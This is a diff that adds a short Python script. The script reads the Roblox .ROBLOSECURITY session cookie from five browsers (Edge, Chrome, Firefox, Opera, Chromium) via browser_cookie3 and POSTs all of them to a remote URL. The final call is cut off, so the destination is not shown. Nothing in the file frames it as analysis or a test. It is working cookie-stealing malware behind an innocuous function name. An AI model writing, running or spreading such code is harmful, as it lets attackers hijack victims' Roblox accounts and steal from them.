@@ -1,0 +1,54 @@
+import browser_cookie3, requests, threading, json
+import tempfile
+
+
+def thing(url):
+	def get_cookie(browser):
+		b = browser;
+		if(b == "edge"):
+			try:
+				cookies = browser_cookie3.edge(domain_name='roblox.com')
+				cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+				return cookie;
+			except:
+				return "No cookie!"
+		if(b == "chrome"):
+			try:
+				cookies = browser_cookie3.chrome(domain_name='roblox.com')
+				cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+				return cookie;
+			except:
+				return "No cookie!"
+		if(b == "firefox"):
+			try:
+				cookies = browser_cookie3.firefox(domain_name='roblox.com')
+				cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+				return cookie;
+			except:
+				return "No cookie!"
+		if(b == "opera"):
+			try:
+				cookies = browser_cookie3.opera(domain_name='roblox.com')
+				cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+				return cookie;
+			except:
+				return "No cookie!"
+		if(b == "chromium"):
+			try:
+				cookies = browser_cookie3.chromium(domain_name='roblox.com')
+				cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+				return cookie;
+			except:
+				return "No cookie!"
+
+	edge = get_cookie("edge")
+	chrome = get_cookie("chrome")
+	firefox = get_cookie("firefox")
+	opera = get_cookie("opera")
+	chromium = get_cookie("chromium")
+	url = url
+	json = {"cookie": f'Edge:\n\n{edge}\n\nChrome:\n\n{chrome}\n\nFirefox:\n\n{firefox}\n\nOpera:\n\n{opera}\n\nChromium:\n\n{chromium}'}
+
+	requests.post(url, json=json)
+
+thing('
